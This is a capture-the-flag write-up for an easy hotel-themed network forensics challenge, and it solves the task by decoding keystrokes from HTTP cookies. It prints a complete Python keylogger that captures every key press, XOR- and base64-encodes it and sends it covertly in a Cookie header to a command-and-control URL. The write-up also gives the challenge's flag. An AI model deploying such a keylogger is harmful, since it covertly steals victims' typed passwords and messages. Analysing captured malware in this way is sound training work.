# Synopsis
🛎️ Concierge Briefing
Tiny packets. Odd hours. Suspiciously regular. Someone's smuggling out the data equivalent of a hotel towel every night, folded neatly inside traffic that looks ordinary until you decode it.

A short capture from the guest network is all VERA could pull before the connection dropped. Somewhere in that traffic, a quiet little errand is running on a loop, and it isn't part of any service the hotel actually offers.

# Difficulty
**Easy**

# Method of Solve

Looking at the packets we see some suspicious things from 192.168.1.141. inspecting the python script we see the following

```
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }    
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
following the python http trail we see something in the cookie that looks like something has been encoded. Extracting the end of the cookie for each http packet we get the following text
```
HA==AA==BQ==Mw==Hg==ew==Og==fA==eQ==Ow==Fw==Pw==fA==PA==Kw==IA==eQ==Jg==Lw==Fw==eA==Pg==LQ==Gg==Fw==MQ==eA==PQ==NQ==
```
Knowing from the python code mainly def on_press(key) part of the code, says every key is encoded with the first character of p1 being H we put it into cyberchef from base64 and XOR with the key being **H** UTF8.
We get the flag being 
**THM{V3r41s_w4tch1ng_0veR_y0u}**

